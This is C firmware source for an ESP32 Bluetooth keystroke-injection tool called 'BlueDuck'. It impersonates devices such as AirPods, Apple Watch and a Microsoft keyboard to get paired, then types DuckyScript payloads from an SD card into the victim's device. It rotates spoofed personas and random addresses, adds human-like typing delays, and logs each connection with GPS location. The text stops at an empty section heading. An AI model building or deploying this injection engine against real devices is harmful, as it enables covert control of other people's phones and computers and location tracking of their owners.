#include "ble_blueduck.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/stat.h>
#include <dirent.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"

#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_gatt.h"
#include "host/ble_uuid.h"
#include "host/ble_hs_adv.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"
#include "os/os_mbuf.h"

static const char *TAG = "BlueDuck";

// ── Persona table (mirrors HoneyPair) ─────────────────────────────────────────

typedef struct {
    const char *name;
    const char *manufacturer;
    const char *model;
    uint8_t     battery_level;
    uint16_t    appearance;
} bd_persona_t;

static const bd_persona_t s_personas[] = {
    { "Wireless Keyboard",  "Microsoft", "Surface Keyboard",  85, 0x03C1 },
    { "AirPods Pro",        "Apple",     "A2698",             92, 0x0941 },
    { "Fitbit Inspire 3",   "Fitbit",    "FB422",             67, 0x0C40 },
    { "Galaxy Buds2 Pro",   "Samsung",   "SM-R510",           78, 0x0941 },
    { "Fenix 7",            "Garmin",    "010-02540-01",      55, 0x00C0 },
    { "Apple Watch",        "Apple",     "A2976",             41, 0x00C0 },
    { "JBL Clip 4",         "JBL",       "JBLCLIP4",          88, 0x0940 },
    { "Logitech MX Keys",   "Logitech",  "920-009294",        73, 0x03C1 },
    { "Samsung 40\" TV",   "Samsung Electronics", "UN40T5300",  0, 0x0180 },
};
#define BD_PERSONA_COUNT    ((int)(sizeof(s_personas)/sizeof(s_personas[0])))
#define BD_AUTO_ROTATE_IDX  BD_PERSONA_COUNT

// ── Script registry ───────────────────────────────────────────────────────────

#define BD_SCRIPT_DIR   "/sdcard/lab/ble/blueduck/scripts"

static char   s_script_names[BD_MAX_SCRIPTS][64];
static char   s_script_paths[BD_MAX_SCRIPTS][128];
static int    s_script_count = 0;
/* PSRAM-backed script content cache — loaded during blueduck_scan_scripts()
   while WiFi DMA RAM is still available; BLE leaves < 1 KB DMA-capable free
   making fopen/fread fail with allocate_dma_buf 0x101 at execution time. */
static char  *s_script_cache[BD_MAX_SCRIPTS];
static size_t s_script_cache_len[BD_MAX_SCRIPTS];

// ── Human typing config ───────────────────────────────────────────────────────

typedef enum { BD_SPEED_FAST = 0, BD_SPEED_NORMAL, BD_SPEED_SLOW } bd_speed_t;

static bd_speed_t s_speed      = BD_SPEED_NORMAL;
static bool       s_human_mode = false;

// ── Module state ──────────────────────────────────────────────────────────────

static SemaphoreHandle_t  s_sd_mutex   = NULL;
static bd_gps_fn_t        s_gps_fn     = NULL;
static volatile bool      s_active     = false;
static volatile bool      s_executing  = false;
static volatile int       s_persona    = 0;
static volatile int       s_connects   = 0;
static volatile int       s_payloads   = 0;
static volatile int       s_disconnects = 0;
static uint16_t           s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static volatile bool      s_paired      = false;
static char               s_log_path[80];
static char               s_script_path[128];

static uint8_t            s_persona_addr[BD_PERSONA_COUNT][6];
static bool               s_addrs_generated = false;
static bool               s_auto_rotate     = false;
static esp_timer_handle_t s_rot_timer       = NULL;
#define BD_ROTATE_PERIOD_US (5ULL * 60 * 1000000)

/* PSRAM-backed task stack (allocated once in blueduck_init); avoids OOM when
 * internal heap is depleted after a BLE advertising session. */
static StaticTask_t  s_payload_tcb;
static StackType_t  *s_payload_stack = NULL;
#define BD_PAYLOAD_STACK_WORDS 4096

// ── GATT definitions (HID keyboard + Battery + DIS) ──────────────────────────

static uint16_t s_batt_lvl_handle;
static uint16_t s_hid_report_handle;

static const uint8_t s_hid_report_map[] = {
    0x05, 0x01,  /* Usage Page (Generic Desktop) */
    0x09, 0x06,  /* Usage (Keyboard) */
    0xA1, 0x01,  /* Collection (Application) */
    0x05, 0x07,  /*   Usage Page (Key Codes) */
    0x19, 0xE0,  /*   Usage Minimum (224) */
    0x29, 0xE7,  /*   Usage Maximum (231) */
    0x15, 0x00,  /*   Logical Minimum (0) */
    0x25, 0x01,  /*   Logical Maximum (1) */
    0x75, 0x01,  /*   Report Size (1) */
    0x95, 0x08,  /*   Report Count (8) */
    0x81, 0x02,  /*   Input (Data, Var, Abs) -- modifier keys */
    0x95, 0x01,  /*   Report Count (1) */
    0x75, 0x08,  /*   Report Size (8) */
    0x81, 0x01,  /*   Input (Const) -- reserved byte */
    0x95, 0x06,  /*   Report Count (6) */
    0x75, 0x08,  /*   Report Size (8) */
    0x15, 0x00,  /*   Logical Minimum (0) */
    0x25, 0x65,  /*   Logical Maximum (101) */
    0x05, 0x07,  /*   Usage Page (Key Codes) */
    0x19, 0x00,  /*   Usage Minimum (0) */
    0x29, 0x65,  /*   Usage Maximum (101) */
    0x81, 0x00,  /*   Input (Data, Array) -- key array */
    /* Output report for LED state (NumLock, CapsLock, ScrollLock) */
    0x05, 0x08,  /*   Usage Page (LEDs) */
    0x19, 0x01,  /*   Usage Minimum (1) */
    0x29, 0x05,  /*   Usage Maximum (5) */
    0x75, 0x01,  /*   Report Size (1) */
    0x95, 0x05,  /*   Report Count (5) */
    0x91, 0x02,  /*   Output (Data, Var, Abs) */
    0x95, 0x01,  /*   Report Count (1) */
    0x75, 0x03,  /*   Report Size (3) */
    0x91, 0x01,  /*   Output (Const) -- padding */
    0xC0,        /* End Collection */
};

static const uint8_t s_hid_info[]    = { 0x11, 0x01, 0x00, 0x02 };
static const uint8_t s_hid_report[]  = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
static const uint8_t s_report_ref[]  = { 0x00, 0x01 };
static       uint8_t s_protocol_mode = 0x01;
static       uint8_t s_led_state     = 0x00;

static int bd_chr_access_cb(uint16_t conn_handle, uint16_t attr_handle,
                             struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)conn_handle; (void)attr_handle; (void)arg;
    const struct ble_gatt_chr_def *chr = ctxt->chr;

    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) {
        uint16_t uuid16 = ble_uuid_u16(chr->uuid);
        if (uuid16 == 0x2A4B) return os_mbuf_append(ctxt->om, s_hid_report_map, sizeof(s_hid_report_map));
        if (uuid16 == 0x2A4A) return os_mbuf_append(ctxt->om, s_hid_info, sizeof(s_hid_info));
        if (uuid16 == 0x2A4D) return os_mbuf_append(ctxt->om, s_hid_report, sizeof(s_hid_report));
        if (uuid16 == 0x2A4E) return os_mbuf_append(ctxt->om, &s_protocol_mode, 1);
        if (uuid16 == 0x2A4C) return 0;
    }
    if (ctxt->op == BLE_GATT_ACCESS_OP_WRITE_CHR) {
        uint16_t uuid16 = ble_uuid_u16(chr->uuid);
        if (uuid16 == 0x2A4E && OS_MBUF_PKTLEN(ctxt->om) >= 1)
            os_mbuf_copydata(ctxt->om, 0, 1, &s_protocol_mode);
        if (uuid16 == 0x2A4D && OS_MBUF_PKTLEN(ctxt->om) >= 1) {
            /* HID output report — LED state feedback (NumLock=b0, CapsLock=b1, ScrollLock=b2) */
            uint8_t leds = 0;
            os_mbuf_copydata(ctxt->om, 0, 1, &leds);
            if (leds != s_led_state) {
                s_led_state = leds;
                ESP_LOGI(TAG, "LED state: NumLk=%d CapsLk=%d ScrlLk=%d",
                         leds & 1, (leds >> 1) & 1, (leds >> 2) & 1);
            }
        }
    }
    return 0;
}

static int bd_dsc_access_cb(uint16_t conn_handle, uint16_t attr_handle,
                             struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)conn_handle; (void)attr_handle; (void)arg;
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_DSC)
        return os_mbuf_append(ctxt->om, s_report_ref, sizeof(s_report_ref));
    return 0;
}

static int bd_batt_access_cb(uint16_t conn_handle, uint16_t attr_handle,
                              struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)conn_handle; (void)attr_handle; (void)arg;
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) {
        uint8_t lvl = s_personas[s_persona < BD_PERSONA_COUNT ? s_persona : 0].battery_level;
        return os_mbuf_append(ctxt->om, &lvl, 1);
    }
    return 0;
}

static int bd_dis_access_cb(uint16_t conn_handle, uint16_t attr_handle,
                             struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)conn_handle; (void)attr_handle;
    int pidx = s_persona < BD_PERSONA_COUNT ? s_persona : 0;
    const char *val = (const char *)arg;
    if (!val) return 0;
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR)
        return os_mbuf_append(ctxt->om, val, strlen(val));
    return 0;
}

static struct ble_gatt_dsc_def s_report_dscs[] = {
    { .uuid = BLE_UUID16_DECLARE(0x2908), .att_flags = BLE_ATT_F_READ, .access_cb = bd_dsc_access_cb },
    { 0 }
};

static const struct ble_gatt_chr_def s_hid_chrs[] = {
    { .uuid = BLE_UUID16_DECLARE(0x2A4E), .access_cb = bd_chr_access_cb,
      .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_WRITE_NO_RSP },
    { .uuid = BLE_UUID16_DECLARE(0x2A4B), .access_cb = bd_chr_access_cb,
      .flags = BLE_GATT_CHR_F_READ },
    { .uuid = BLE_UUID16_DECLARE(0x2A4A), .access_cb = bd_chr_access_cb,
      .flags = BLE_GATT_CHR_F_READ },
    { .uuid = BLE_UUID16_DECLARE(0x2A4C), .access_cb = bd_chr_access_cb,
      .flags = BLE_GATT_CHR_F_WRITE_NO_RSP },
    { .uuid = BLE_UUID16_DECLARE(0x2A4D), .access_cb = bd_chr_access_cb,
      .val_handle = &s_hid_report_handle,
      .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_WRITE | BLE_GATT_CHR_F_NOTIFY,
      .descriptors = s_report_dscs },
    { 0 }
};

static const struct ble_gatt_chr_def s_batt_chrs[] = {
    { .uuid = BLE_UUID16_DECLARE(0x2A19), .access_cb = bd_batt_access_cb,
      .val_handle = &s_batt_lvl_handle,
      .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY },
    { 0 }
};

static const struct ble_gatt_chr_def s_dis_chrs[] = {
    { .uuid = BLE_UUID16_DECLARE(0x2A29), .access_cb = bd_dis_access_cb,
      .arg = (void*)s_personas[0].manufacturer, .flags = BLE_GATT_CHR_F_READ },
    { .uuid = BLE_UUID16_DECLARE(0x2A24), .access_cb = bd_dis_access_cb,
      .arg = (void*)s_personas[0].model,        .flags = BLE_GATT_CHR_F_READ },
    { 0 }
};

static const struct ble_gatt_svc_def s_bd_svcs[] = {
    { .type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = BLE_UUID16_DECLARE(0x1812),
      .characteristics = s_hid_chrs },
    { .type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = BLE_UUID16_DECLARE(0x180F),
      .characteristics = s_batt_chrs },
    { .type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = BLE_UUID16_DECLARE(0x180A),
      .characteristics = s_dis_chrs },
    { 0 }
};

// ── HID keycode table ─────────────────────────────────────────────────────────
// Indexed by ASCII value. High byte = modifier (0x02=shift), low byte = HID keycode.
// 0x0000 = unsupported character.

static const uint16_t s_keymap[128] = {
/*  0 NUL */0,       /*  1 */0,       /*  2 */0,       /*  3 */0,
/*  4 */0,           /*  5 */0,       /*  6 */0,       /*  7 */0,
/*  8 BS  */0x002A,  /*  9 TAB*/0x002B, /* 10 LF*/0x0028, /* 11 */0,
/* 12 */0,           /* 13 CR */0x0028, /* 14 */0,     /* 15 */0,
/* 16-31: non-printable */
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
/*  32 SPC*/0x002C,
/*  33 !  */0x021E,  /*  34 "  */0x0234,  /*  35 #  */0x0220,
/*  36 $  */0x0221,  /*  37 %  */0x0222,  /*  38 &  */0x0224,
/*  39 '  */0x0034,  /*  40 (  */0x0226,  /*  41 )  */0x0227,
/*  42 *  */0x0225,  /*  43 +  */0x022E,  /*  44 ,  */0x0036,
/*  45 -  */0x002D,  /*  46 .  */0x0037,  /*  47 /  */0x0038,
/*  48 0  */0x0027,  /*  49 1  */0x001E,  /*  50 2  */0x001F,
/*  51 3  */0x0020,  /*  52 4  */0x0021,  /*  53 5  */0x0022,
/*  54 6  */0x0023,  /*  55 7  */0x0024,  /*  56 8  */0x0025,
/*  57 9  */0x0026,
/*  58 :  */0x0233,  /*  59 ;  */0x0033,  /*  60 <  */0x0236,
/*  61 =  */0x002E,  /*  62 >  */0x0237,  /*  63 ?  */0x0238,
/*  64 @  */0x021F,
/*  65 A  */0x0204,  /*  66 B  */0x0205,  /*  67 C  */0x0206,
/*  68 D  */0x0207,  /*  69 E  */0x0208,  /*  70 F  */0x0209,
/*  71 G  */0x020A,  /*  72 H  */0x020B,  /*  73 I  */0x020C,
/*  74 J  */0x020D,  /*  75 K  */0x020E,  /*  76 L  */0x020F,
/*  77 M  */0x0210,  /*  78 N  */0x0211,  /*  79 O  */0x0212,
/*  80 P  */0x0213,  /*  81 Q  */0x0214,  /*  82 R  */0x0215,
/*  83 S  */0x0216,  /*  84 T  */0x0217,  /*  85 U  */0x0218,
/*  86 V  */0x0219,  /*  87 W  */0x021A,  /*  88 X  */0x021B,
/*  89 Y  */0x021C,  /*  90 Z  */0x021D,
/*  91 [  */0x002F,  /*  92 \  */0x0031,  /*  93 ]  */0x0030,
/*  94 ^  */0x0223,  /*  95 _  */0x022D,  /*  96 `  */0x0035,
/*  97 a  */0x0004,  /*  98 b  */0x0005,  /*  99 c  */0x0006,
/* 100 d  */0x0007,  /* 101 e  */0x0008,  /* 102 f  */0x0009,
/* 103 g  */0x000A,  /* 104 h  */0x000B,  /* 105 i  */0x000C,
/* 106 j  */0x000D,  /* 107 k  */0x000E,  /* 108 l  */0x000F,
/* 109 m  */0x0010,  /* 110 n  */0x0011,  /* 111 o  */0x0012,
/* 112 p  */0x0013,  /* 113 q  */0x0014,  /* 114 r  */0x0015,
/* 115 s  */0x0016,  /* 116 t  */0x0017,  /* 117 u  */0x0018,
/* 118 v  */0x0019,  /* 119 w  */0x001A,  /* 120 x  */0x001B,
/* 121 y  */0x001C,  /* 122 z  */0x001D,
/* 123 {  */0x022F,  /* 124 |  */0x0231,  /* 125 }  */0x0230,
/* 126 ~  */0x0235,  /* 127 DEL*/0x004C,
};

// ── HID key sending ───────────────────────────────────────────────────────────

/* BLE 4.0 minimum connection event interval ~7.5ms; use >=20ms between reports. */
#define BD_KEY_HOLD_MS   20

static void bd_send_report(uint8_t modifier, uint8_t keycode)
{
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE) return;
    uint8_t report[8] = { modifier, 0, keycode, 0, 0, 0, 0, 0 };
    struct os_mbuf *om = ble_hs_mbuf_from_flat(report, sizeof(report));
    if (!om) return;
    ble_gatts_notify_custom(s_conn_handle, s_hid_report_handle, om);
}

static void bd_key_tap(uint8_t modifier, uint8_t keycode)
{
    /* Modifier keycodes (0xE0-0xE7) belong in the modifier byte only.
     * The HID descriptor Usage Maximum for the key array is 0x65; sending a
     * code >= 0xE0 there is out-of-range and silently dropped by Android. */
    uint8_t kc = (keycode >= 0xE0) ? 0x00 : keycode;
    bd_send_report(modifier, kc);
    vTaskDelay(pdMS_TO_TICKS(BD_KEY_HOLD_MS));
    bd_send_report(0, 0);  /* key up */
    vTaskDelay(pdMS_TO_TICKS(BD_KEY_HOLD_MS));  /* full interval — BLE min CI is 7.5 ms */
}

/* Human typing delay for one character. Space gets extra inter-word pause. */
static void bd_human_delay(char c)
{
    uint32_t lo, hi;
    switch (s_speed) {
        case BD_SPEED_FAST:   lo = 20;  hi = 60;  break;
        case BD_SPEED_SLOW:   lo = 150; hi = 400; break;
        default:              lo = 50;  hi = 150; break;
    }
    uint32_t delay = lo + (esp_random() % (hi - lo + 1));
    /* Word boundary: space or punctuation ending a word */
    if (c == ' ' || c == '.' || c == ',' || c == '?' || c == '!' || c == '\n')
        delay += 100 + (esp_random() % 400);
    vTaskDelay(pdMS_TO_TICKS(delay));
}

static void bd_type_char(char c)
{
    if ((unsigned char)c >= 128) return;
    uint16_t entry = s_keymap[(unsigned char)c];
    if (!entry) return;
    uint8_t modifier = (entry >> 8) & 0xFF;
    uint8_t keycode  = entry & 0xFF;
    bd_key_tap(modifier, keycode);
    if (s_human_mode) bd_human_delay(c);
}

static void bd_type_string(const char *str)
{
    if (!str) return;
    while (*str && s_active && s_conn_handle != BLE_HS_CONN_HANDLE_NONE)
        bd_type_char(*str++);
}

// Named key lookup: returns (modifier<<8)|keycode, or 0 if not found.
static uint16_t bd_named_key(const char *name)
{
    struct { const char *n; uint16_t kc; } tbl[] = {
        {"ENTER",     0x0028}, {"RETURN",    0x0028},
        {"SPACE",     0x002C}, {"TAB",       0x002B},
        {"BACKSPACE", 0x002A}, {"DELETE",    0x004C},
        {"DEL",       0x004C}, {"ESCAPE",    0x0029},
        {"ESC",       0x0029}, {"HOME",      0x004A},
        {"END",       0x004D}, {"PAGEUP",    0x004B},
        {"PAGEDOWN",  0x004E}, {"INSERT",    0x0049},
        {"UP",        0x0052}, {"DOWN",      0x0051},
        {"LEFT",      0x0050}, {"RIGHT",     0x004F},
        {"CAPS_LOCK", 0x0039}, {"NUM_LOCK",  0x0053},
        {"PRINT_SCREEN", 0x0046}, {"PRTSC",  0x0046},
        {"SCROLL_LOCK",  0x0047},
        {"PAUSE",        0x0048}, {"BREAK",  0x0048},
        {"F1",        0x003A}, {"F2",        0x003B},
        {"F3",        0x003C}, {"F4",        0x003D},
        {"F5",        0x003E}, {"F6",        0x003F},
        {"F7",        0x0040}, {"F8",        0x0041},
        {"F9",        0x0042}, {"F10",       0x0043},
        {"F11",       0x0044}, {"F12",       0x0045},
        /* Modifier-only keys — used as first arg in combos */
        {"GUI",       0x08E3}, {"WINDOWS",   0x08E3}, {"COMMAND",  0x08E3},
        {"CTRL",      0x01E0}, {"CONTROL",   0x01E0},
        {"ALT",       0x04E2}, {"OPTION",    0x04E2},
        {"SHIFT",     0x02E1},
        {NULL, 0}
    };
    for (int i = 0; tbl[i].n; i++)
        if (strcasecmp(name, tbl[i].n) == 0) return tbl[i].kc;
    /* Single letter */
    if (strlen(name) == 1) {
        char c = name[0];
        if (c >= 'A' && c <= 'Z') return (uint16_t)(c - 'A' + 0x04);
        if (c >= 'a' && c <= 'z') return (uint16_t)(c - 'a' + 0x04);
        if (c >= '1' && c <= '9') return (uint16_t)(c - '1' + 0x1E);
        if (c == '0') return 0x0027;
    }
    return 0;
}

/* Modifier byte from a modifier-key entry (high byte is the mask, low byte the keycode) */
static uint8_t bd_modifier_mask(uint16_t entry) { return (entry >> 8) & 0xFF; }

// ── DuckyScript parser ────────────────────────────────────────────────────────

#define BD_MAX_LINE  512

typedef struct {
    uint32_t default_delay_ms;
    uint8_t  last_modifier;
    uint8_t  last_keycode;
    bool     stop;
} bd_exec_ctx_t;

static void bd_exec_line(const char *line, bd_exec_ctx_t *ctx)
{
    /* Skip leading whitespace */
    while (*line == ' ' || *line == '\t') line++;
    if (!*line || *line == '\n' || *line == '\r') return;

    /* ── REM / comment ── */
    if (strncasecmp(line, "REM", 3) == 0 && (line[3] == ' ' || line[3] == '\0' || line[3] == '\n'))
        return;

    /* ── DELAY / WAIT ── */
    if (strncasecmp(line, "DELAY ", 6) == 0 || strncasecmp(line, "WAIT ", 5) == 0) {
        int ms = atoi(strchr(line, ' ') + 1);
        if (ms > 0) vTaskDelay(pdMS_TO_TICKS(ms));
        return;
    }

    /* ── DEFAULTDELAY / DEFAULT_DELAY ── */
    if (strncasecmp(line, "DEFAULTDELAY ", 13) == 0 || strncasecmp(line, "DEFAULT_DELAY ", 14) == 0) {
        ctx->default_delay_ms = (uint32_t)atoi(strchr(line, ' ') + 1);
        return;
    }

    /* ── HUMAN_MODE ── */
    if (strncasecmp(line, "HUMAN_MODE ", 11) == 0) {
        const char *arg = line + 11;
        while (*arg == ' ') arg++;
        s_human_mode = (strncasecmp(arg, "ON", 2) == 0);
        return;
    }

    /* ── HUMAN_SPEED ── */
    if (strncasecmp(line, "HUMAN_SPEED ", 12) == 0) {
        const char *arg = line + 12;
        while (*arg == ' ') arg++;
        if      (strncasecmp(arg, "FAST", 4) == 0) s_speed = BD_SPEED_FAST;
        else if (strncasecmp(arg, "SLOW", 4) == 0) s_speed = BD_SPEED_SLOW;
        else                                         s_speed = BD_SPEED_NORMAL;
        return;
    }

    /* ── STRING / STRINGLN ── */
    bool stringln = (strncasecmp(line, "STRINGLN ", 9) == 0);
    if (stringln || strncasecmp(line, "STRING ", 7) == 0) {
        const char *text = line + (stringln ? 9 : 7);
        bd_type_string(text);
        if (stringln) bd_key_tap(0, 0x28);  /* ENTER */
        ctx->last_modifier = 0;
        ctx->last_keycode  = 0x00;  /* no single-key repeat for STRING */
        if (ctx->default_delay_ms) vTaskDelay(pdMS_TO_TICKS(ctx->default_delay_ms));
        return;
    }

    /* ── REPEAT ── */
    if (strncasecmp(line, "REPEAT ", 7) == 0) {
        int n = atoi(line + 7);
        for (int i = 0; i < n && s_active; i++) {
            if (ctx->last_keycode)
                bd_key_tap(ctx->last_modifier, ctx->last_keycode);
            if (ctx->default_delay_ms) vTaskDelay(pdMS_TO_TICKS(ctx->default_delay_ms));
        }
        return;
    }

    /* ── Modifier combos: CTRL-ALT, CTRL-SHIFT, ALT-SHIFT, GUI-SHIFT, etc. ── */
    /* Format: MOD1-MOD2 KEY  or  MOD1-MOD2-MOD3 KEY */
    {
        char buf[BD_MAX_LINE];
        strncpy(buf, line, sizeof(buf) - 1);
        buf[sizeof(buf) - 1] = '\0';
        /* Strip trailing newline */
        char *nl = strchr(buf, '\n'); if (nl) *nl = '\0';
        nl = strchr(buf, '\r'); if (nl) *nl = '\0';

        uint8_t combo_mod = 0;
        char   *tok  = buf;
        char   *sp   = strchr(buf, ' ');

        /* Walk dash-separated tokens before the final space-separated key argument */
        if (sp) {
            *sp = '\0';
            /* buf now = "CTRL-ALT" or "GUI-SHIFT" etc., sp+1 = key name */
            char *dash = strtok(tok, "-");
            while (dash) {
                uint16_t entry = bd_named_key(dash);
                if (entry) combo_mod |= bd_modifier_mask(entry);
                dash = strtok(NULL, "-");
            }
            /* The last token from strtok is the final modifier; the actual key is sp+1 */
            const char *key_name = sp + 1;
            while (*key_name == ' ') key_name++;
            uint16_t key_entry = bd_named_key(key_name);
            uint8_t  keycode   = (uint8_t)(key_entry & 0xFF);
            /* If the "combo" had only one modifier token, combo_mod may include the key's
             * modifier bits; for a solo CTRL/ALT/GUI+key the modifier is the mod itself. */
            if (combo_mod && keycode) {
                bd_key_tap(combo_mod, keycode);
                ctx->last_modifier = combo_mod;
                ctx->last_keycode  = keycode;
                if (ctx->default_delay_ms) vTaskDelay(pdMS_TO_TICKS(ctx->default_delay_ms));
                return;
            }
        }

        /* ── Single named key (no space, no combo) ── */
        buf[0] = '\0';
        strncpy(buf, line, sizeof(buf) - 1);
        nl = strchr(buf, '\n'); if (nl) *nl = '\0';
        nl = strchr(buf, '\r'); if (nl) *nl = '\0';
        uint16_t entry = bd_named_key(buf);
        if (entry && !(entry >> 8)) {  /* keycode only, not a bare modifier */
            uint8_t kc = (uint8_t)(entry & 0xFF);
            bd_key_tap(0, kc);
            ctx->last_modifier = 0;
            ctx->last_keycode  = kc;
            if (ctx->default_delay_ms) vTaskDelay(pdMS_TO_TICKS(ctx->default_delay_ms));
            return;
        }
    }

    ESP_LOGW(TAG, "Unrecognised line: %.60s", line);
}

static void bd_exec_script(const char *path)
{
    /* Prefer PSRAM cache — SD DMA alloc fails when BLE is active (< 1 KB free) */
    for (int i = 0; i < s_script_count; i++) {
        if (strcmp(s_script_paths[i], path) == 0 && s_script_cache[i]) {
            ESP_LOGI(TAG, "Executing script from PSRAM cache: %s (%u bytes)",
                     path, (unsigned)s_script_cache_len[i]);
            s_executing = true;
            bd_exec_ctx_t ctx = { .default_delay_ms = 0 };
            char line[BD_MAX_LINE];
            const char *p   = s_script_cache[i];
            const char *end = p + s_script_cache_len[i];
            while (p < end && s_active &&
                   s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
                const char *nl = memchr(p, '\n', (size_t)(end - p));
                size_t ll = nl ? (size_t)(nl - p) : (size_t)(end - p);
                if (ll >= sizeof(line)) ll = sizeof(line) - 1;
                memcpy(line, p, ll);
                line[ll] = '\0';
                bd_exec_line(line, &ctx);
                p = nl ? nl + 1 : end;
            }
            s_executing = false;
            ESP_LOGI(TAG, "Script complete");
            return;
        }
    }

    /* Fallback: direct file I/O (only works before BLE init) */
    FILE *f = fopen(path, "r");
    if (!f) {
        ESP_LOGE(TAG, "Cannot open script: %s (not cached, SD DMA likely OOM)", path);
        return;
    }

    ESP_LOGI(TAG, "Executing script from SD: %s", path);
    s_executing = true;

    bd_exec_ctx_t ctx = { .default_delay_ms = 0 };
    char line[BD_MAX_LINE];

    while (fgets(line, sizeof(line), f) && s_active &&
           s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        bd_exec_line(line, &ctx);
    }

    fclose(f);
    s_executing = false;
    ESP_LOGI(TAG, "Script complete");
}

// ── Script execution task ─────────────────────────────────────────────────────

static void bd_payload_task(void *arg)
{
    (void)arg;
    /* Wait for pairing (ENC_CHANGE) before sending keystrokes.
     * Android drops HID reports sent before encryption is established.
     * Poll up to 8 s; if the device never pairs, still attempt delivery. */
    const int PAIR_TIMEOUT_MS = 8000;
    const int PAIR_POLL_MS    = 100;
    int waited = 0;
    while (!s_paired && waited < PAIR_TIMEOUT_MS &&
           s_active && s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        vTaskDelay(pdMS_TO_TICKS(PAIR_POLL_MS));
        waited += PAIR_POLL_MS;
    }

    if (!s_active || s_conn_handle == BLE_HS_CONN_HANDLE_NONE) {
        vTaskDelete(NULL);
        return;
    }

    /* Post-pair settle: allow Android's keyboard setup dialog to dismiss */
    vTaskDelay(pdMS_TO_TICKS(3000));

    s_payloads++;

    /* Log LED state before script — captures current CapsLock/NumLock state */
    {
        char kv[192];
        snprintf(kv, sizeof(kv), "\"script\":\"%s\",\"leds\":%d,\"paired\":%s",
                 s_script_path, s_led_state, s_paired ? "true" : "false");
        /* inline log since we're in a task context */
        const gps_data_t *gps = s_gps_fn ? s_gps_fn() : NULL;
        char ts[12] = "";
        if (gps && gps->time_utc[0]) snprintf(ts, sizeof(ts), "%s", gps->time_utc);
        char line[256];
        snprintf(line, sizeof(line),
                 "{\"ts\":\"%s\",\"event\":\"payload_start\",\"persona\":\"%s\",%s}\n",
                 ts, s_personas[s_persona < BD_PERSONA_COUNT ? s_persona : 0].name, kv);
        if (s_sd_mutex && s_log_path[0] &&
            xSemaphoreTake(s_sd_mutex, pdMS_TO_TICKS(400)) == pdTRUE) {
            FILE *lf = fopen(s_log_path, "a");
            if (lf) { fputs(line, lf); fclose(lf); }
            xSemaphoreGive(s_sd_mutex);
        }
    }

    bd_exec_script(s_script_path);

    /* Post-script delay then disconnect */
    vTaskDelay(pdMS_TO_TICKS(2000));

    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }

    vTaskDelete(NULL);
}

// ── JSONL logging ─────────────────────────────────────────────────────────────

static void bd_log(const char *event, const char *addr, const char *extra_kv)
{
    if (!s_log_path[0] || !s_sd_mutex) return;
    const gps_data_t *gps = s_gps_fn ? s_gps_fn() : NULL;
    char ts[12] = "";
    if (gps && gps->time_utc[0]) snprintf(ts, sizeof(ts), "%s", gps->time_utc);
    int pidx = s_persona < BD_PERSONA_COUNT ? s_persona : 0;
    char line[256];
    int n = snprintf(line, sizeof(line),
                     "{\"ts\":\"%s\",\"event\":\"%s\",\"persona\":\"%s\"",
                     ts, event, s_personas[pidx].name);
    if (addr && addr[0])
        n += snprintf(line + n, sizeof(line) - n, ",\"addr\":\"%s\"", addr);
    if (gps && gps->valid)
        n += snprintf(line + n, sizeof(line) - n, ",\"lat\":%.6f,\"lon\":%.6f",
                      (double)gps->latitude, (double)gps->longitude);
    if (extra_kv && extra_kv[0])
        n += snprintf(line + n, sizeof(line) - n, ",%s", extra_kv);
    snprintf(line + n, sizeof(line) - n, "}\n");
    if (xSemaphoreTake(s_sd_mutex, pdMS_TO_TICKS(400)) == pdTRUE) {
        FILE *f = fopen(s_log_path, "a");
        if (f) { fputs(line, f); fclose(f); }
        xSemaphoreGive(s_sd_mutex);
    }
}

static void bd_addr_str(const uint8_t *val, char *out18)
{
    snprintf(out18, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             val[5], val[4], val[3], val[2], val[1], val[0]);
}

// ── Forward declarations ──────────────────────────────────────────────────────

static int  bd_gap_cb(struct ble_gap_event *event, void *arg);
static void bd_ext_adv_start(int persona_idx);

// ── Auto-rotate ───────────────────────────────────────────────────────────────

static void bd_rot_timer_cb(void *arg)
{
    (void)arg;
    if (!s_active || !s_auto_rotate || s_executing) return;
    int next = (s_persona + 1) % BD_PERSONA_COUNT;
    s_persona = next;
    bd_log("auto_rotate", NULL, NULL);
    ESP_LOGI(TAG, "Auto-rotate -> persona %d ('%s')", next, s_personas[next].name);
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE)
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    else
        bd_ext_adv_start(next);
}

// ── Per-persona random addresses ──────────────────────────────────────────────

static void bd_gen_persona_addrs(void)
{
    if (s_addrs_generated) return;
    for (int i = 0; i < BD_PERSONA_COUNT; i++) {
        esp_fill_random(s_persona_addr[i], 6);
        s_persona_addr[i][5] |= 0xC0;
    }
    s_addrs_generated = true;
}

// ── Extended advertising ──────────────────────────────────────────────────────

